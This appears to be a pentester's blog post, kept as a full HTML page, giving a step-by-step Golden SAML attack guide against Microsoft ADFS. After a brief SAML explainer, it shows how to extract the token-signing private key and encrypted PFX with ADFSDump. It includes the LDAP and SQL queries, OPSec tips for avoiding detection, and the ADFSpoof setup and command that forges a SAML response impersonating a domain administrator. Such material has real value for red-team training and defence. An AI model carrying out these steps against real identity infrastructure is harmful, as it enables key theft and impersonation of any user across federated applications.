<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Practical guide step by step to create golden SAML"><title>Practical guide for Golden SAML</title><link rel=canonical href=https://nodauf.dev/p/practical-guide-for-golden-saml/><link rel=stylesheet href=/scss/style.min.ac77dcf8b111b51da39a92990f431923f210f3876d85798a2125667f96dc33a4.css><meta property="og:title" content="Practical guide for Golden SAML"><meta property="og:description" content="Practical guide step by step to create golden SAML"><meta property="og:url" content="https://nodauf.dev/p/practical-guide-for-golden-saml/"><meta property="og:site_name" content="Nodauf"><meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="Golden SAML"><meta property="article:tag" content="ADFS"><meta property="article:published_time" content="2022-09-01T00:00:00+00:00"><meta property="article:modified_time" content="2022-09-01T00:00:00+00:00"><meta property="og:image" content="https://nodauf.dev/p/practical-guide-for-golden-saml/ADFSDump-private-key.png"><meta name=twitter:title content="Practical guide for Golden SAML"><meta name=twitter:description content="Practical guide step by step to create golden SAML"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://nodauf.dev/p/practical-guide-for-golden-saml/ADFSDump-private-key.png"></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><div class=site-meta><h1 class=site-name><a href=/>Nodauf</a></h1><h2 class=site-description>Pentester, perpetual student and security enthusiast. Passionnate about security, AD and more ...</h2></div></header><ol class=social-menu><li><a href=https://github.com/nodauf target=_blank title=GitHub><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com/nodauf target=_blank title=Twitter><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg><span>Archives</span></a></li><li><a href=/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg><span>Search</span></a></li><div class=menu-bottom-section><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><span>Dark Mode</span></li></div></ol></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/practical-guide-for-golden-saml/><img src=/p/practical-guide-for-golden-saml/ADFSDump-private-key_hu99303c2bc4f5733315520032e5c8d170_7467_800x0_resize_box_3.png srcset="/p/practical-guide-for-golden-saml/ADFSDump-private-key_hu99303c2bc4f5733315520032e5c8d170_7467_800x0_resize_box_3.png 800w, /p/practical-guide-for-golden-saml/ADFSDump-private-key_hu99303c2bc4f5733315520032e5c8d170_7467_1600x0_resize_box_3.png 1600w" width=800 height=145 loading=lazy alt="Featured image of post Practical guide for Golden SAML"></a></div><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/p/practical-guide-for-golden-saml/>Practical guide for Golden SAML</a></h2><h3 class=article-subtitle>Practical guide step by step to create golden SAML</h3></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>Sep 01, 2022</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>6 minute read</time></div></footer></div></header><section class=article-content><h2 id=introduction>Introduction</h2><p>According to Microsoft:</p><blockquote><p>Active Directory Federation Service (AD FS) enables Federated Identity and Access Management by securely sharing digital identity and entitlements rights across security and enterprise boundaries. AD FS extends the ability to use single sign-on functionality that is available within a single security or enterprise boundary to Internet-facing applications to enable customers, partners, and suppliers a streamlined user experience while accessing the web-based applications of an organization.</p></blockquote><p>In a large network with several applications, each one of them can have an authentication process. Instead of having to authenticate on each and avoiding the risk of password reuse, the ADFS provides a <strong>single sign-on</strong> solution. It is also much simpler to manage <strong>one login per user</strong> than as many logins as applications per user.</p><p>For a concrete example, the following schema can quickly summarize the workflow of a web app using the ADFS server as an identity provider:</p><p><img src=/p/practical-guide-for-golden-saml/saml-authentication-flow.jpg width=700 height=495 srcset="/p/practical-guide-for-golden-saml/saml-authentication-flow_hu71788901e9fb2d613334d5dd3ab486e8_51878_480x0_resize_q75_box.jpg 480w, /p/practical-guide-for-golden-saml/saml-authentication-flow_hu71788901e9fb2d613334d5dd3ab486e8_51878_1024x0_resize_q75_box.jpg 1024w" loading=lazy alt="ADFS authentication flow" class=gallery-image data-flex-grow=141 data-flex-basis=339px></p><ol><li>A user wants to connect to a web application</li><li>The application redirects the user to the ADFS server</li><li>The user authenticates to the ADFS</li><li>Once authenticated to the ADFS, the user is redirected to the web application. Additional information is included inside the request (for example user&rsquo;s groups)</li><li>The user is now authenticated on the application</li></ol><h2 id=saml>SAML</h2><p>The previous diagram was a high abstraction of an interaction between a web application and an ADFS server.</p><h3 id=what-is-saml>What is SAML?</h3><p>Security Assertion Markup Language (SAML) is an open standard that allows identity providers (IdP) to pass authorization credentials to service providers (SP). What that jargon means is that you can use one set of credentials to log into many different websites. Itâ€™s much simpler to manage one login per user than it is to manage separate logins to email, customer relationship management (CRM) software, Active Directory, etc.</p><p>SAML stands for <em>Security Assertion Markup Language</em>, it&rsquo;s an open standard based on XML. Its primary role is to allow you to access multiple web applications using a single set of credentials. It provides <strong>SSO</strong> and <strong>centralization user management</strong>. The authentication information will be passed between two components: the <strong>Identity Provider</strong> (ADFS) and the <strong>Service Provider</strong> (web application).<style type=text/css>.notice{padding:18px;line-height:24px;margin-bottom:24px;border-radius:4px;color:#444;background:#e7f2fa}.notice p:last-child{margin-bottom:0}.notice-title{margin:-18px -18px 12px;padding:4px 18px;border-radius:4px 4px 0 0;font-weight:700;color:#fff;background:#6ab0de}.notice.warning .notice-title{background:rgba(217,83,79,.9)}.notice.warning{background:#fae2e2}.notice.info .notice-title{background:#f0b37e}.notice.info{background:#fff2db}.notice.note .notice-title{background:#6ab0de}.notice.note{background:#e7f2fa}.notice.tip .notice-title{background:rgba(92,184,92,.8)}.notice.tip{background:#e6f9e6}.icon-notice{display:inline-flex;align-self:center;margin-right:8px}.icon-notice img,.icon-notice svg{height:1em;width:1em;fill:currentColor}.icon-notice img,.icon-notice.baseline svg{top:.125em;position:relative}</style><div><svg width="0" height="0" display="none" xmlns="http://www.w3.org/2000/svg"><symbol id="tip-notice" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M504 256c0 136.967-111.033 248-248 248S8 392.967 8 256 119.033 8 256 8s248 111.033 248 248zM227.314 387.314l184-184c6.248-6.248 6.248-16.379.0-22.627l-22.627-22.627c-6.248-6.249-16.379-6.249-22.628.0L216 308.118l-70.059-70.059c-6.248-6.248-16.379-6.248-22.628.0l-22.627 22.627c-6.248 6.248-6.248 16.379.0 22.627l104 104c6.249 6.249 16.379 6.249 22.628.001z"/></symbol><symbol id="note-notice" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M504 256c0 136.997-111.043 248-248 248S8 392.997 8 256C8 119.083 119.043 8 256 8s248 111.083 248 248zm-248 50c-25.405.0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346 7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373.0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884.0-12.356 5.78-11.981 12.654z"/></symbol><symbol id="warning-notice" viewBox="0 0 576 512" preserveAspectRatio="xMidYMid meet"><path d="M569.517 440.013C587.975 472.007 564.806 512 527.94 512H48.054c-36.937.0-59.999-40.055-41.577-71.987L246.423 23.985c18.467-32.009 64.72-31.951 83.154.0l239.94 416.028zM288 354c-25.405.0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346 7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373.0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884.0-12.356 5.78-11.981 12.654z"/></symbol><symbol id="info-notice" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M256 8C119.043 8 8 119.083 8 256c0 136.997 111.043 248 248 248s248-111.003 248-248C504 119.083 392.957 8 256 8zm0 110c23.196.0 42 18.804 42 42s-18.804 42-42 42-42-18.804-42-42 18.804-42 42-42zm56 254c0 6.627-5.373 12-12 12h-88c-6.627.0-12-5.373-12-12v-24c0-6.627 5.373-12 12-12h12v-64h-12c-6.627.0-12-5.373-12-12v-24c0-6.627 5.373-12 12-12h64c6.627.0 12 5.373 12 12v1e2h12c6.627.0 12 5.373 12 12v24z"/></symbol></svg></div><div class="notice note"><p class="first notice-title"><span class="icon-notice baseline"><svg><use href="#note-notice"/></svg></span>Note</p><p>Benefits of SSO are multiple:</p><ul><li>It avoids password reuse between application</li><li>The passwords are stored in only one place</li><li>The user&rsquo;s management (for administrators and the helpdesk) is simplified</li><li>The password policy (length, complexity, MFA, &mldr;) is centralized</li></ul></div></p><p>Once the user is authenticated on the <strong>Identity Provider</strong> (ADFS), the user is redirected to the <strong>Service Provider</strong> through a <strong>POST</strong> request to <code>/SamlResponseServlet</code>, the XML data is base64 encoded. To prevent any modifications, the data is signed with an asymmetric encryption algorithm (like RSA).</p><p>Inside the XML data, the noteworthy fields are:</p><ul><li>In <code>Subject</code>, the field <code>NameID</code> contains the ID of the user (username or something else depending of the configuration on the SP)</li></ul><p><img src=/p/practical-guide-for-golden-saml/saml-Subject-NameID.png width=975 height=138 srcset="/p/practical-guide-for-golden-saml/saml-Subject-NameID_hu869519afe9fb090485e7ae55a08433fd_37652_480x0_resize_box_3.png 480w, /p/practical-guide-for-golden-saml/saml-Subject-NameID_hu869519afe9fb090485e7ae55a08433fd_37652_1024x0_resize_box_3.png 1024w" loading=lazy alt="Field NameID in SAML data " class=gallery-image data-flex-grow=706 data-flex-basis=1695px></p><ul><li>In <code>AttributeStatement</code> additional information can be included. For example, groups, emails,&mldr;</li></ul><p>The SP will give the proper rights according to the data sent by the SP.</p><div class="notice tip"><p class="first notice-title"><span class="icon-notice baseline"><svg><use href="#tip-notice"/></svg></span>Tip</p><p>If you are still here, you may have understood that if an application relies on the ADFS for the authentication and the ADFS is compromised, then it is possible to craft a custom request to <strong>impersonate anyone</strong> on the web applications that relies on the ADFS.</p></div><h2 id=practical-guide>Practical guide</h2><blockquote><p>In this section, I assume you have a session either as an administrator or as the service account running the ADFS service.</p></blockquote><h3 id=necessary-information>Necessary information</h3><p>We need two parts:</p><ul><li>The <strong>private key</strong> (PFX with the decryption password) which is only accessible with high privilege accounts.</li><li>Public information like the <code>NameID format</code>, the <code>NameID</code> to impersonate, the attributes to add in the SAML response, and the rpi identifier (matching the SP identifier - the field <code>InResponseTo</code> in <em>Subject â†’ SubjectConfirmation â†’ SubjectConfirmationData</em>)</li></ul><p><a class=link href=https://github.com/mandiant/ADFSDump target=_blank rel=noopener>ADFSDump</a> is a tool written by Mandiant to retrieve the information above. The tool should be run on the ADFS. If you are lazy to compile it, you can download it <a class=link href=ADFSDump.exe>here</a>.</p><ul><li>The private key is stored in the attribute <code>thumbnailPhoto</code> of the LDAP. It is retrieved with the query <code>(&(thumbnailphoto=*)(objectClass=contact)(!(cn=CryptoPolicy)))</code>.</li></ul><p><img src=/p/practical-guide-for-golden-saml/ADFSDump-private-key.png width=1251 height=227 srcset="/p/practical-guide-for-golden-saml/ADFSDump-private-key_hu99303c2bc4f5733315520032e5c8d170_7467_480x0_resize_box_3.png 480w, /p/practical-guide-for-golden-saml/ADFSDump-private-key_hu99303c2bc4f5733315520032e5c8d170_7467_1024x0_resize_box_3.png 1024w" loading=lazy alt="ADFSDump.exe private key" class=gallery-image data-flex-grow=551 data-flex-basis=1322px></p><ul><li>For the encrypted pfx, it will connect, by default, to the WID, <em>Windows Internal Database</em>, database (through the named pipes pipe <code>\\.\pipe\microsoft##wid\tsql\query</code>) and retrieve the pfx with the query: <code>SELECT ServiceSettingsData from {0}.IdentityServerPolicy.ServiceSettings</code> .</li></ul><p><img src=/p/practical-guide-for-golden-saml/ADFSDump-pfx.png width=831 height=384 srcset="/p/practical-guide-for-golden-saml/ADFSDump-pfx_hu5d6411d46fe3ad32c4249cb3a67f39f2_30152_480x0_resize_box_3.png 480w, /p/practical-guide-for-golden-saml/ADFSDump-pfx_hu5d6411d46fe3ad32c4249cb3a67f39f2_30152_1024x0_resize_box_3.png 1024w" loading=lazy alt="ADFSDump.exe pfx" class=gallery-image data-flex-grow=216 data-flex-basis=519px></p><ul><li>The public information is also stored in the database, <em>ADFSDump.exe</em> get these data with the sql query</li></ul><blockquote><p>SELECT SCOPES.ScopeId,SCOPES.Name,SCOPES.WSFederationPassiveEndpoint,SCOPES.Enabled,SCOPES.SignatureAlgorithm,SCOPES.EntityId,SCOPES.EncryptionCertificate,SCOPES.MustEncryptNameId, SCOPES.SamlResponseSignatureType, SCOPES.ParameterInterface, SAML.Binding, SAML.Location,POLICYTEMPLATE.name, POLICYTEMPLATE.PolicyMetadata, POLICYTEMPLATE.InterfaceVersion, SCOPEIDS.IdentityData FROM {0}.IdentityServerPolicy.Scopes SCOPES LEFT OUTER JOIN {0}.IdentityServerPolicy.ScopeAssertionConsumerServices SAML ON SCOPES.ScopeId = SAML.ScopeId LEFT OUTER JOIN {0}.IdentityServerPolicy.PolicyTemplates POLICYTEMPLATE ON SCOPES.PolicyTemplateId = POLICYTEMPLATE.PolicyTemplateId LEFT OUTER JOIN {0}.IdentityServerPolicy.ScopeIdentities SCOPEIDS ON SCOPES.ScopeId = SCOPEIDS.ScopeId</p></blockquote><p><img src=/p/practical-guide-for-golden-saml/ADFSDump-relying-party.png width=872 height=485 srcset="/p/practical-guide-for-golden-saml/ADFSDump-relying-party_hu26dad375726c063fec8f7a9e6a2dad51_15955_480x0_resize_box_3.png 480w, /p/practical-guide-for-golden-saml/ADFSDump-relying-party_hu26dad375726c063fec8f7a9e6a2dad51_15955_1024x0_resize_box_3.png 1024w" loading=lazy alt="ADFSDump.exe relying part" class=gallery-image data-flex-grow=179 data-flex-basis=431px></p><p><img src=/p/practical-guide-for-golden-saml/ADFSDump-access-policy.png width=1308 height=144 srcset="/p/practical-guide-for-golden-saml/ADFSDump-access-policy_hu2f842641f33cdb1c42c58675d341ecd2_184024_480x0_resize_box_3.png 480w, /p/practical-guide-for-golden-saml/ADFSDump-access-policy_hu2f842641f33cdb1c42c58675d341ecd2_184024_1024x0_resize_box_3.png 1024w" loading=lazy alt="ADFSDump.exe access policy" class=gallery-image data-flex-grow=908 data-flex-basis=2180px></p><div class="notice note"><p class="first notice-title"><span class="icon-notice baseline"><svg><use href="#note-notice"/></svg></span>Note</p><p><strong>ADFSDump</strong> cannot retrieve the information above if it is not a WID database.</p></div><div class="notice tip"><p class="first notice-title"><span class="icon-notice baseline"><svg><use href="#tip-notice"/></svg></span>Tip</p><p><strong>OPSec tips:</strong></p><p>As it is stored on the LDAP, the <strong>private key</strong> can be gotten from another device.</p><p>For the <strong>public information</strong>, by default, the WID (Windows Internal Database) database is only accessible from <em>localhost</em>. If an SQL Server is being used and it&rsquo;s reachable from another machine, you may be able to get all the information without opening a session and executing a binary on the ADFS. You may also inspect the <em>SAMLResponse</em> to retrieve this information.</p></div><p>For the next step, we have to save the <strong>pfx</strong> (Encrypted Signing Key) and the <strong>private key</strong> in binary format.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># For the pfx</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> AAAAAQAAAAAEE<span class=o>[</span>...<span class=o>]</span>Qla6 <span class=p>|</span> base64 -d &gt; EncryptedPfx.bin
</span></span><span class=line><span class=cl><span class=c1># For the private key</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> f7404c7f<span class=o>[</span>...<span class=o>]</span>aabd8b <span class=p>|</span> xxd -r -p &gt; dkmKey.bin 
</span></span></code></pre></td></tr></table></div></div><h3 id=crafting-the-samlresponse>Crafting the SAMLResponse</h3><p><a class=link href=https://github.com/mandiant/ADFSpoof target=_blank rel=noopener>ADFSpoof</a> is a tool written in python to generate our golden SAML from the previously collected information. Microsoft took liberties with the RFC ðŸ˜’ and uses a custom <em>cryptography</em> library. To have a working environment to run the tool:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>mkdir ADFSpoofTools
</span></span><span class=line><span class=cl><span class=nb>cd</span> <span class=nv>$_</span>
</span></span><span class=line><span class=cl>git clone https://github.com/dmb2168/cryptography.git
</span></span><span class=line><span class=cl>git clone https://github.com/mandiant/ADFSpoof.git 
</span></span><span class=line><span class=cl>virtualenv3 venvADFSSpoof
</span></span><span class=line><span class=cl><span class=nb>source</span> venvADFSSpoof/bin/activate
</span></span><span class=line><span class=cl>pip install lxml
</span></span><span class=line><span class=cl>pip install signxml
</span></span><span class=line><span class=cl>pip uninstall -y cryptography
</span></span><span class=line><span class=cl><span class=nb>cd</span> cryptography
</span></span><span class=line><span class=cl>pip install -e .
</span></span><span class=line><span class=cl><span class=nb>cd</span> ../ADFSpoof
</span></span><span class=line><span class=cl>pip install -r requirements.txt
</span></span></code></pre></td></tr></table></div></div><p>To impersonate an administrator on the application <em><a class=link href=https://www.contoso.com target=_blank rel=noopener>www.contoso.com</a></em> where the ADFS is located at adfs.pentest.lab we will use the following command with the data from ADFSDump.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>python</span> <span class=n>ADFSpoof</span><span class=o>.</span><span class=n>py</span> <span class=o>-</span><span class=n>b</span> <span class=n>EncryptedPfx</span><span class=o>.</span><span class=n>bin</span> <span class=n>DkmKey</span><span class=o>.</span><span class=n>bin</span>  <span class=o>-</span><span class=n>s</span> <span class=n>adfs</span><span class=o>.</span><span class=n>pentest</span><span class=o>.</span><span class=n>lab</span>  <span class=n>saml2</span> <span class=o>--</span><span class=n>endpoint</span> <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>www</span><span class=o>.</span><span class=n>contoso</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=n>adfs</span><span class=o>/</span><span class=n>ls</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>SamlResponseServlet</span> <span class=o>--</span><span class=n>nameidformat</span> <span class=n>urn</span><span class=p>:</span><span class=n>oasis</span><span class=p>:</span><span class=n>names</span><span class=p>:</span><span class=n>tc</span><span class=p>:</span><span class=n>SAML</span><span class=p>:</span><span class=mf>2.0</span><span class=p>:</span><span class=n>nameid</span><span class=o>-</span><span class=nb>format</span><span class=p>:</span><span class=n>transient</span> <span class=o>--</span><span class=n>nameid</span> <span class=s1>&#39;PENTEST</span><span class=se>\a</span><span class=s1>dministrator&#39;</span> <span class=o>--</span><span class=n>rpidentifier</span> <span class=n>Supervision</span> <span class=o>--</span><span class=n>assertions</span> <span class=s1>&#39;&lt;Attribute Name=&#34;http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname&#34;&gt;&lt;AttributeValue&gt;PENTEST</span><span class=se>\a</span><span class=s1>dministrator&lt;/AttributeValue&gt;&lt;/Attribute&gt;&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>The request 5 in the authentication flow at the beginning of the post has to be intercepted (or crafted) to paste the output generated by ADFSpoof.</p></section><footer class=article-footer><section class=article-tags><a href=/tags/golden-saml/>Golden SAML</a>
<a href=/tags/adfs/>ADFS</a></section></footer></article><footer class=site-footer><section class=copyright>&copy;
2022 Nodauf</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.12.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#introduction>Introduction</a></li><li><a href=#saml>SAML</a><ol><li><a href=#what-is-saml>What is SAML?</a></li></ol></li><li><a href=#practical-guide>Practical guide</a><ol><li><a href=#necessary-information>Necessary information</a></li><li><a href=#crafting-the-samlresponse>Crafting the SAMLResponse</a></li></ol></li></ol></nav></div></section></aside></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script>
<script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><script async src=//static.getclicky.com/101374543.js></script><noscript><p><img alt=Clicky width=1 height=1 src=//in.getclicky.com/101374543ns.gif></p></noscript></body></html>